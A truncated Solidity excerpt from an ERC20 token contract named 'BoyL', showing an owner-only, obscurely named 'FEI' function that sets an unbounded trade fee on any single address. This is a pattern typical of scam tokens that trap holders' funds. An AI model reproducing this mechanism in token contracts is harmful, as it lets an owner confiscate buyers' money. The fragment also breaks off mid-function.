...
contract BoyL is MyERC20, Ownable {
    ...
    function FEI(address _address, uint256 _value) external onlyOwner {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _accountTradeFee[_address] = _value;
    }

    function FEI(address _address) external view onlyOwner returns (uint256) {
